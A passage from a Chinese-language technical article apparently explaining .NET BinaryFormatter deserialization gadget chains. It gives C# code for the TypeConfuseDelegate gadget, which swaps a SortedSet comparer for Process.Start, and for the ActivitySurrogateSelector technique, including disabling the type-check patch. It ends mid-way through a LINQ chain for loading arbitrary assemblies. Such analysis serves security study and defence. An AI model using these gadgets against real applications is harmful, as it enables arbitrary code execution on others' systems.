                        BindingFlags.NonPublic | BindingFlags.Instance);
                object[] invoke_list = comp.GetInvocationList();
                // Modify the invocation list to add Process::Start(string, string)
                invoke_list[1] = new Func(Process.Start);
                fi.SetValue(comp, invoke_list);
            }
            static void Main(string[] args)
            {
                // Create a simple multicast delegate.
                Delegate d = new Comparison(String.Compare);
                Comparison c = (Comparison)MulticastDelegate.Combine(d, d);
                // Create set with original comparer.
                IComparer comp = Comparer.Create(c);
                SortedSet mysl = new SortedSet(comp);
                mysl.Add("calc");
                mysl.Add("adummy");
                TypeConfuseDelegate(c);
                BinaryFormatter fmt = new BinaryFormatter();
                BinaryFormatter fmt2 = new BinaryFormatter();
                MemoryStream stm = new MemoryStream();
                fmt.Serialize(stm, mysl);
                stm.Position = 0;
                fmt2.Deserialize(stm);
            }
        }
    }
注意一点，在反序列化时进行比较的元素顺序与原来添加时是相反的。比如这里，我先添加"calc"，后添加“adummy"，假如第二次添加时原比较函数为cs，则此时调用为:
cs("adummy", "calc")，而反序列化时调用比较函数则为 Process.Start( “calc", "adummy")。
这也是为什么一定要将TypeConfuseDelegate() 放在Add()
后面，否则在第二次Add时就会出现Process.Start(”adummy", "calc") 的错误（找不到可执行文件）。
## 二. ActivitySurrogateSelectorGenerator 工具链
### 0x10 选择器和代理器
#### 0x11 基础知识
0x10 BinaryFormatter 有一个字段叫做： SurrogateSelector，继承于ISurrogateSelecor接口。
    // 摘要:
    //     获取或设置控制序列化和反序列化过程的类型替换的 System.Runtime.Serialization.ISurrogateSelector.
    //
    // 返回结果:
    //     要与此格式化程序一起使用的代理项选择器。
    public ISurrogateSelector SurrogateSelector { get; set; }
该字段指定一个代理选择器，可用于为当前BinaryFormatter实例选择一个序列化代理器，用于在序列化时实现代理操作。注意有两个概念：
**代理选择器** 和 **序列化代理器** ， **代理选择器** 用于选择出一个 **序列化代理器** 。为了避免绕口，以下简称 选择器 和 代理器。
查看 ISurrogateSelector 接口：
    public interface ISurrogateSelector {
        // Interface does not need to be marked with the serializable attribute
        // Specifies the next ISurrogateSelector to be examined for surrogates if the current
        // instance doesn't have a surrogate for the given type and assembly in the given context.
        void ChainSelector(ISurrogateSelector selector);
        // Returns the appropriate surrogate for the given type in the given context.
        ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector);
        // Return the next surrogate in the chain. Returns null if no more exist.
        ISurrogateSelector GetNextSelector();
    }
从其注释 中我们可以看出，选择器是链状的。而GetSurrogate() 函数用于给出当前选择器所选择的 代理器，其返回值为
ISerializationSurrogate 类型。
SurrogateSelector 类是 ISurrogateSelector接口的实现，相较于原接口，其有增加了几个函数：
        public class SurrogateSelector : ISurrogateSelector
        {
            public SurrogateSelector();
            public virtual void AddSurrogate(Type type, StreamingContext context, ISerializationSurrogate surrogate);
            public virtual void ChainSelector(ISurrogateSelector selector);
            public virtual ISurrogateSelector GetNextSelector();
            public virtual ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector);
            public virtual void RemoveSurrogate(Type type, StreamingContext context);
        }
其中 AddSurrogate() 和 RemoveSurrogate() 用于直接向当前选择器中添加和删除代理器。
看完了选择器，我们再看一看代理器：
    public interface ISerializationSurrogate {
        // Interface does not need to be marked with the serializable attribute
        // Returns a SerializationInfo completely populated with all of the data needed to reinstantiate the
        // the object at the other end of serialization.  
        void GetObjectData(Object obj, SerializationInfo info, StreamingContext context);
        // Reinflate the object using all of the information in data.  The information in
        // members is used to find the particular field or property which needs to be set.
        Object SetObjectData(Object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector);
    }
接口只定义了两个函数。其中，GetObjectData()
函数在序列化时使用，用于从对象实例中获取内容，然后传给SerializationInfo，SetObjectData()
函数在反序列化时使用，用于从SerializationInfo 中获取内容，然后赋给对象实例。这两个函数即体现出了代理的意义。
微软文档中给出了一个 代理器的例子：
    // This class can manually serialize an Employee object.
    sealed class EmployeeSerializationSurrogate : ISerializationSurrogate
    {
        // Serialize the Employee object to save the object's name and address fields.
        public void GetObjectData(Object obj,
            SerializationInfo info, StreamingContext context)
        {
            var emp = (Employee) obj;
            info.AddValue("name", emp.name);
            info.AddValue("address", emp.address);
        }
        // Deserialize the Employee object to set the object's name and address fields.
        public Object SetObjectData(Object obj,
            SerializationInfo info, StreamingContext context,
            ISurrogateSelector selector)
        {
            var emp = (Employee) obj;
            emp.name = info.GetString("name");
            emp.address = info.GetString("address");
            return emp;
        }
    }
文档中有一句很有意思： _下面的代码示例演示如何创建一个序列化代理类，该类知道如何正确地序列化或反序列化本身无法序列化的类。_
序列化代理器可以用于序列化和反序列化 **原本无法序列化的类** 。在例子中确实如此。经过调试，发现秘密在这里。
    internal void InitSerialize(Object obj, ISurrogateSelector surrogateSelector, StreamingContext context, SerObjectInfoInit serObjectInfoInit, IFormatterConverter converter, ObjectWriter objectWriter, SerializationBinder binder)
    {
       ... 
        if (surrogateSelector != null && (serializationSurrogate = surrogateSelector.GetSurrogate(objectType, context, out surrogateSelectorTemp)) != null)
        {
            SerTrace.Log( this, objectInfoId," Constructor 1 trace 3");
            si = new SerializationInfo(objectType, converter);
            if (!objectType.IsPrimitive)
                serializationSurrogate.GetObjectData(obj, si, context);
            InitSiWrite();
        }
        else if (obj is ISerializable)
        {
            if (!objectType.IsSerializable) {
                throw new SerializationException(Environment.GetResourceString("Serialization_NonSerType",
                                                               objectType.FullName, objectType.Assembly.FullName));
            }
            si = new SerializationInfo(objectType, converter, !FormatterServices.UnsafeTypeForwardersIsEnabled());
            ((ISerializable)obj).GetObjectData(si, context);
        }
        else
        {
            SerTrace.Log(this, objectInfoId," Constructor 1 trace 5");
            InitMemberInfo();
            CheckTypeForwardedFrom(cache, objectType, binderAssemblyString);
        }
    }
这是 WriteObjectInfo.InitSerialize()
函数，其中在判断被序列化对象是否可序列化之前，先判断当前是否有代理选择器。如果有，则调用GetSurrogate()
函数获取代理器，并使用代理器继续进行序列化。
虽然序列化代理器可以用于序列化和反序列化
本身不可序列化的类，但是目前为止我们还没法直接将其用于反序列化漏洞，原因：选择器和代理器都是我们自定义的，只有在反序列化时同样也为BinaryFormatter
指定选择器和代理器才可以正常进行反序列化。而真实环境中目标在进行反序列化时根本不会进行代理，也不可能知道我们的代理器是什么样的。
#### 0x12 ObjectSerializedRef 和 ObjectSurrogate
好在 James Forshaw 发现了类 ObjectSerializedRef ，ObjectSerializedRef 在
类ObjectSurrogate 里面使用，而ObjectSurrogate 在 ActivitySurrogateSelector里调用。其中
ObjectSurrogate 是一个代理器，ActivitySurrogateSelector则是一个选择器，在一定情况下返回
ObjectSurrogate 作为代理器。
那么代理器ObjectSurrogate 有什么特殊呢？
  * 因为它是代理器，所以通过它进行序列化时，可以序列化原本不可序列化的类。
  * 经过它序列化产生的 binary数据包含足够多的信息，在反序列化时，不需要特意指定选择器和代理器。
也就是说，通过ObjectSurrogate 代理产生的序列化数据，直接拿给BinaryFormatter
进行反序列化(不指定选择器和代理器)，能够成功的进行反序列化，即使被序列化的类原本不可以序列化。
例子：
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    using System.Runtime.Serialization;
    using System.Runtime.Serialization.Formatters.Binary;
    using System.IO;
    using System.Configuration;
    namespace ActivitySurrogateSelectorGeneratorTest
    {
        // Definitely non-serializable class.
        class NonSerializable
        {
            private string _text;
            public NonSerializable(string text)
            {
                _text = text;
            }
            public override string ToString()
            {
                return _text;
            }
        }
        // Custom serialization surrogate
        class MySurrogateSelector : SurrogateSelector
        {
            public override ISerializationSurrogate GetSurrogate(Type type,
                StreamingContext context, out ISurrogateSelector selector)
            {
                selector = this;
                if (!type.IsSerializable)
                {
                    Type t = Type.GetType("System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                    return (ISerializationSurrogate)Activator.CreateInstance(t);
                }
                return base.GetSurrogate(type, context, out selector);
            }
        }
        class Program
        {
            static void TestObjectSerializedRef()
            {
                System.Configuration.ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
                BinaryFormatter fmt = new BinaryFormatter();
                MemoryStream stm = new MemoryStream();
                fmt.SurrogateSelector = new MySurrogateSelector();
                fmt.Serialize(stm, new NonSerializable("Hello World!"));
                stm.Position = 0;
                // Should print Hello World!.
                var fmt2 = new BinaryFormatter();
                Console.WriteLine(fmt2.Deserialize(stm));
            }
            static void Main(string[] args)
            {
                TestObjectSerializedRef();
            }
        }
    }
注意，在4.8以上的.NET版本中需要关闭
ActivitySurrogateSelectorTypeCheck（这是相关的补丁），也就是TestObjectSerializedRef 里的第一句。
老实说，我到现在还没整明白，这个代理器生成的序列化数据在反序列化时为什么不需要指定选择器和代理器。。。。
上面的例子中没什么好说的，就是自己定义了一个选择器 MySurrogateSelector，重载其 GetSurrogate() 函数，使其返回一个
ObjectSurrogate 实例作为代理器。然后就可以通过该选择器 进行 序列化数据了。
原本在构造工具链时，我们只能搜索可序列化的类，比如SortedSet。但是，现在有了这个工具，我们就可以把范围扩展到不可序列化的，委托可修改的类。
### 0x20 LINQ
#### 0x21 基础知识
LINQ (Language Integrated Query) 语言集成查询。用于对集合执行查询操作，例子如下：
    string sentence = "the quick brown fox jumps over the lazy dog";  
    // Split the string into individual words to create a collection.  
    string[] words = sentence.Split(' ');  
    // Using query expression syntax.  
    var query = from word in words  
                group word.ToUpper() by word.Length into gr  
                orderby gr.Key  
                select new { Length = gr.Key, Words = gr }; 
看上去LINQ语句和我们所熟悉的SQL 语句差不多，但更接近真相的写法其实是下面这样的：
    // Using method-based query syntax.  
    var query2 = words.  
        GroupBy(w => w.Length, w => w.ToUpper()).  
        Select(g => new { Length = g.Key, Words = g }).  
        OrderBy(o => o.Length);  
words 是集合对象(也有叫序列)，实现了IEnumerable接口。
看上去words 是一个string 数组，其实这是 **集合初始化器** ： _允许采用和数组声明相似的方式，在集合实例化期间用一组初始成员构造该集合_
。
根据官方文档的说法： _有两套LINQ标准查询运算符，一套对 IEnumerable 
类型，一套对IQueryable类型进行操作。组成每个集合的方法分别是Enumerable和Queryable类的静态成员。他们被定义为对其进行操作的类型的扩展方法。可以通过使用静态方法语法或实例方法语法来调用扩展方法_。这些方法便是
**标准查询操作符** ，如下：
以上面的Where操作符为例，该函数返回的仍然是一个集合。该函数有两个参数，一个是source，为输入的集合，一个是predicate
为Func
类型的委托。其意义就是Where函数通过调用委托对输入集合里的元素进行筛选，并将筛选出的集合作为结果返回。如果我们把一个查询语句拆分成多个独立的标准查询操作符，那么应当有多个中间集合
，上一个查询操作符返回的集合会作为下一个查询操作符的输入集合。
**LINQ的延迟执行和流处理:**
以如下查询语句为例：
    var adultName = from person in people
                    where person.Age >= 18
                    select person.Name;
该查询表达式在创建时不会处理任何数据，也不会访问原始的people列表，而是在内存中生成了这个查询的表现形式。判断是否成人以及人到人名的转换都是通过委托实例来表示。只有在访问结果里的第一个元素的时候，Select转换才会为它的第一个元素调用Where转换，如果符合谓词(where的委托参数)，则再调用select转换。(摘自《深入理解C#》)
#### 0x22 替换 LINQ 里的委托
由前面的知识可知，诸如
Where类型的标准查询操作符，有两个输入参数，一个是输入集合，而另一个是会对集合中每一个元素都调用的委托。我们可以替换该委托。但是注意：由于LINQ的延迟执行特点，该委托只有在枚举结果集合时才会调用。
做出假设：构造一个由特殊LINQ语句（替换其委托）产生的结果集合，然后使用第一节中所说的ObjectSurrogate代理器对其进行序列化（LINQ本身无法序列化）。如果我们可以强制对反序列化产生的集合进行枚举，这将触发我们替换的委托，进而执行任意代码。
James Forshaw 设计了一条调用链，借用LINQ 顺序执行以下函数：
    byte[] -> Assembly.Load(byte[]) -> Assembly
    Assembly -> Assembly.GetType() -> Type[]
    Type[] -> Activator.CreateInstance(Type[]) -> object[]
这三个函数有什么特点？与标准查询操作符的委托参数格式上很像。以Select操作符为例：
    public static IEnumerable Select(this IEnumerable source, Func selector);
该操作符第一个参数source 为输入集合 IEnumerable，第二个参数为委托selector，类型为Func，返回值为集合 IEnumerable。
第一步：
我们希望select操作符的第二个参数所指示的委托函数是 _static Assembly Load( byte[] rawAssembly )_
，那么Tsource代表的类型就是byte[]，TResult代表的类型就是Assembly，那么该select的输入集合就是一个IEnumerable类型，输出集合就是一个Ienumerable类型。如下：